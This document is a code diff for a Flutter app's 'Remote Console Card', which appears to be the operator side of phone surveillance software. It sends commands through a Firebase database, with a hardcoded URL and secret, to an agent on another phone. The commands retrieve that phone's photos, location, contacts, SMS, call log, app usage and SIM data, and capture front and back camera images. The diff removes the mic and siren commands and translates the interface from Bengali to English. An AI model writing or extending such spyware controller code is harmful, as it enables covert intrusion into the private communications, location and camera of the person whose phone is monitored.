@@ -4,13 +4,11 @@ import 'dart:io';
 import 'dart:typed_data';
 
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
 
 // ── Remote bridge ────────────────────────────────────────────────────────
 const String kFbUrl =
     'https://aniket-remote-default-rtdb.asia-southeast1.firebasedatabase.app';
 const String kFbSecret = 'atp2617';
-const MethodChannel _gChannel = MethodChannel('aniket_pro_ai/gallery');
 
 Future<dynamic> _fbGet(String path) async {
   try {
@@ -66,18 +64,25 @@ bool infoOnline(Map<String, dynamic>? i) {
 
 String _errHint(String? e) {
   switch (e) {
-    case 'no_perm': return 'ওই ফোনে এই পারমিশনটা ON নেই';
-    case 'usage_access_off': return 'ওই ফোনে Settings → Usage access ON করতে হবে';
-    case 'cam_fail': return 'ক্যামেরা খোলা যায়নি (অ্যাপ খোলা থাকলে আবার চেষ্টা করো)';
-    case 'mic_fail': return 'মাইক রেকর্ড ব্যর্থ';
-    case 'not_found': return 'ফাইলটা আর নেই';
-    case 'no_fix': return 'লোকেশন এখনো পাওয়া যায়নি (GPS অন থাকলে পরে চেষ্টা করো)';
-    default: return e ?? 'অজানা এরর';
+    case 'no_perm': return 'Permission not enabled on that phone';
+    case 'usage_access_off': return 'Usage access is OFF on that phone (Settings)';
+    case 'cam_fail': return 'Camera could not open on that phone';
+    case 'not_found': return 'File not found';
+    case 'no_fix': return 'No location fix yet (GPS on?)';
+    default: return e ?? 'Unknown error';
   }
 }
 
+String _agoText(int ms) {
+  final s = ms ~/ 1000;
+  if (s < 60) return '${s}s ago';
+  final m = s ~/ 60;
+  if (m < 60) return '${m}m ago';
+  return '${m ~/ 60}h ago';
+}
+
 // ═══════════════════════════════════════════════════════════════════════
-//  REMOTE CONSOLE CARD — per-device control panel (offline = hidden)
+//  REMOTE CONSOLE CARD — always visible + diagnostics (no Mic/Siren/Ping)
 // ═══════════════════════════════════════════════════════════════════════
 class RemoteConsoleCard extends StatefulWidget {
   final String deviceId;
@@ -91,7 +96,7 @@ class RemoteConsoleCard extends StatefulWidget {
 class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
   Map<String, dynamic> _perms = {};
   Map<String, dynamic>? _info;
-  bool _open = false;
+  bool _open = true;
   String? _busy;
   Timer? _t;
 
@@ -120,10 +125,21 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
 
   bool get _online => infoOnline(_info);
 
+  int _p(String k) => (_perms[k] as num?)?.toInt() ?? 0;
+
+  String _diagText() {
+    if (_info == null) return 'Never connected — app not opened on that phone yet';
+    final err = (_info!['err'] ?? '').toString();
+    final ls = (_info!['lastSeen'] as num?)?.toInt() ?? 0;
+    if (err.isNotEmpty) return 'Agent report: $err';
+    if (ls == 0) return 'Agent stopped on that phone';
+    return 'Last seen ${_agoText(DateTime.now().millisecondsSinceEpoch - ls)}';
+  }
+
   Future<void> _onCmd(String type, {String? path}) async {
     if (_busy != null) return;
     if (!_online) {
-      _snack('ফোনটি অফলাইন 📴 — ওই ফোনে নতুন অ্যাপ ইন্সটল + Agent চালু না হওয়া পর্যন্ত কাজ করবে না');
+      _snack('Phone is offline — open the app on that phone first');
       return;
     }
     setState(() => _busy = type);
@@ -131,7 +147,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
     if (!mounted) return;
     setState(() => _busy = null);
     if (res == null) {
-      _snack('সাড়া নেই — ফোনটা কি অফলাইন? 📴');
+      _snack('No response — phone offline?');
       return;
     }
     if (res['ok'] != true) {
@@ -154,7 +170,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
     if (!mounted) return;
     setState(() => _busy = null);
     if (res == null || res['ok'] != true) {
-      _snack(res == null ? 'সাড়া নেই 📴' : _errHint(res['err']?.toString()));
+      _snack(res == null ? 'No response' : _errHint(res['err']?.toString()));
       return;
     }
     final b64 = (res['data'] as Map?)?['img']?.toString();
@@ -171,26 +187,6 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
       }
       return;
     }
-    if (type == 'mic') {
-      final b64 = (data as Map?)?['aud']?.toString();
-      if (b64 != null) {
-        () async {
-          try {
-            final f = File('${Directory.systemTemp.path}/remote_mic.m4a');
-            await f.writeAsBytes(base64Decode(b64));
-            await _gChannel.invokeMethod('playFile', f.path);
-            _snack('অডিও চলছে 🔊');
-          } catch (_) {
-            _snack('অডিও চালানো যায়নি');
-          }
-        }();
-      }
-      return;
-    }
-    if (type == 'siren') {
-      _snack('সাইরেন পাঠানো হয়েছে 🚨');
-      return;
-    }
     showModalBottomSheet(
       context: context,
       backgroundColor: const Color(0xFF1E1E1E),
@@ -204,7 +200,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
     String title = type;
     List<Widget> body = [];
     if (type == 'galleryList' && data is List) {
-      title = 'রিমোট গ্যালারি (${data.length})';
+      title = 'Remote Gallery (${data.length})';
       body = data.map((e) {
         final m = Map<String, dynamic>.from(e as Map);
         final dt = DateTime.fromMillisecondsSinceEpoch(((m['date'] as num?)?.toInt() ?? 0) * 1000);
@@ -226,7 +222,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
         );
       }).toList();
     } else if ((type == 'contacts' || type == 'sms' || type == 'calls' || type == 'apps') && data is List) {
-      title = {'contacts': 'কন্টাক্ট', 'sms': 'SMS', 'calls': 'কল লগ', 'apps': 'অ্যাপ ব্যবহার'}[type]!;
+      title = {'contacts': 'Contacts', 'sms': 'SMS', 'calls': 'Call Log', 'apps': 'App Usage'}[type]!;
       body = data.map((e) {
         final m = Map<String, dynamic>.from(e as Map);
         String t1 = '', t2 = '';
@@ -242,13 +238,13 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
         );
       }).toList();
     } else if (data is Map) {
-      title = {'loc': 'লোকেশন', 'sim': 'SIM তথ্য', 'ping': 'ডিভাইস', 'perms': 'পারমিশন'}[type] ?? type;
+      title = {'loc': 'Location', 'sim': 'SIM Info', 'perms': 'Permissions'}[type] ?? type;
       body = data.entries.map((e) => ListTile(
             dense: true,
             title: Text('${e.key}: ${e.value}', style: const TextStyle(color: Colors.white, fontSize: 13)),
           )).toList();
     } else {
-      body = [const Center(child: Text('ডাটা নেই', style: TextStyle(color: Colors.white54)))];
+      body = [const Center(child: Text('No data', style: TextStyle(color: Colors.white54)))];
     }
     return DraggableScrollableSheet(
       expand: false,
@@ -266,13 +262,12 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
   }
 
   Widget _pIcon(String key) {
-    final granted = _online && (_perms[key] as num?)?.toInt() == 1;
+    final granted = _online && _p(key) == 1;
     IconData normal;
     IconData slashed;
     switch (key) {
       case 'cam': normal = Icons.camera_alt; slashed = Icons.no_photography; break;
       case 'pho': normal = Icons.photo_library; slashed = Icons.hide_image; break;
-      case 'mic': normal = Icons.mic; slashed = Icons.mic_off; break;
       case 'loc': normal = Icons.location_on; slashed = Icons.location_off; break;
       case 'con': normal = Icons.contacts; slashed = Icons.person_off; break;
       case 'not': normal = Icons.notifications; slashed = Icons.notifications_off; break;
@@ -288,38 +283,51 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
     );
   }
 
-  Widget _cmdBtn(String type, IconData ic, String label) {
+  Widget _cmdBtn(String type, IconData ic, String label, String? permKey) {
+    Color dot;
+    if (!_online) {
+      dot = Colors.grey;
+    } else if (permKey == null) {
+      dot = Colors.green;
+    } else {
+      dot = _p(permKey) == 1 ? Colors.green : Colors.redAccent;
+    }
     return Padding(
       padding: const EdgeInsets.all(3),
-      child: InkWell(
-        borderRadius: BorderRadius.circular(10),
-        onTap: () => _onCmd(type),
-        child: Container(
-          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
-          decoration: BoxDecoration(
-            color: const Color(0xFF252525),
+      child: Stack(
+        clipBehavior: Clip.none,
+        children: [
+          InkWell(
             borderRadius: BorderRadius.circular(10),
-            border: Border.all(color: const Color(0xFFF5E6C8).withOpacity(_online ? 0.2 : 0.08)),
+            onTap: () => _onCmd(type),
+            child: Container(
+              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
+              decoration: BoxDecoration(
+                color: const Color(0xFF252525),
+                borderRadius: BorderRadius.circular(10),
+                border: Border.all(color: const Color(0xFFF5E6C8).withOpacity(_online ? 0.2 : 0.08)),
+              ),
+              child: Row(
+                mainAxisSize: MainAxisSize.min,
+                children: [
+                  _busy == type
+                      ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFF5E6C8)))
+                      : Icon(ic, color: _online ? const Color(0xFFF5E6C8) : Colors.white24, size: 15),
+                  const SizedBox(width: 6),
+                  Text(label,
+                      style: TextStyle(color: _online ? Colors.white70 : Colors.white24, fontSize: 11)),
+                ],
+              ),
+            ),
           ),
-          child: Row(
-            mainAxisSize: MainAxisSize.min,
-            children: [
-              _busy == type
-                  ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFF5E6C8)))
-                  : Icon(ic, color: _online ? const Color(0xFFF5E6C8) : Colors.white24, size: 15),
-              const SizedBox(width: 6),
-              Text(label,
-                  style: TextStyle(color: _online ? Colors.white70 : Colors.white24, fontSize: 11)),
-            ],
-          ),
-        ),
+          Positioned(top: -3, right: -3, child: Container(width: 10, height: 10, decoration: BoxDecoration(shape: BoxShape.circle, color: dot))),
+        ],
       ),
     );
   }
 
   @override
   Widget build(BuildContext context) {
-    if (!_online) return const SizedBox.shrink();
     return Container(
       margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
       padding: const EdgeInsets.all(10),
@@ -342,7 +350,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
                 const SizedBox(width: 8),
                 Expanded(
                   child: Text(
-                    '${widget.label}  •  ${_online ? 'অনলাইন 🟢' : 'অফলাইন ⚫ (এজেন্ট নেই)'}',
+                    '${widget.label}  •  ${_online ? 'Online' : 'Offline'}',
                     style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w600),
                   ),
                 ),
@@ -350,24 +358,23 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
               ],
             ),
           ),
+          const SizedBox(height: 4),
+          Text(_diagText(), style: TextStyle(color: _online ? Colors.green : Colors.orange, fontSize: 10)),
           const SizedBox(height: 6),
-          Row(children: ['cam', 'pho', 'mic', 'loc', 'con', 'not', 'sms', 'cal'].map(_pIcon).toList()),
+          Row(children: ['cam', 'pho', 'loc', 'con', 'not', 'sms', 'cal'].map(_pIcon).toList()),
           if (_open) ...[
             const SizedBox(height: 8),
             Wrap(
               children: [
-                _cmdBtn('galleryList', Icons.photo_library, 'Gallery'),
-                _cmdBtn('loc', Icons.location_on, 'Location'),
-                _cmdBtn('contacts', Icons.contacts, 'Contacts'),
-                _cmdBtn('camfront', Icons.face, 'Samner Cam'),
-                _cmdBtn('camback', Icons.photo_camera, 'Pechoner Cam'),
-                _cmdBtn('mic', Icons.mic, 'Mic 6s'),
-                _cmdBtn('sms', Icons.sms, 'SMS'),
-                _cmdBtn('calls', Icons.call, 'Calls'),
-                _cmdBtn('apps', Icons.apps, 'Apps'),
-                _cmdBtn('siren', Icons.campaign, 'Siren'),
-                _cmdBtn('sim', Icons.sim_card, 'SIM'),
-                _cmdBtn('ping', Icons.wifi_tethering, 'Ping'),
+                _cmdBtn('galleryList', Icons.photo_library, 'Gallery', 'pho'),
+                _cmdBtn('loc', Icons.location_on, 'Location', 'loc'),
+                _cmdBtn('contacts', Icons.contacts, 'Contacts', 'con'),
+                _cmdBtn('camfront', Icons.face, 'Front Cam', 'cam'),
+                _cmdBtn('camback', Icons.photo_camera, 'Back Cam', 'cam'),
+                _cmdBtn('sms', Icons.sms, 'SMS', 'sms'),
+                _cmdBtn('calls', Icons.call, 'Calls', 'cal'),
+                _cmdBtn('apps', Icons.apps, 'Apps', null),
+                _cmdBtn('sim', Icons.sim_card, 'SIM', null),
               ],
             ),
           ],
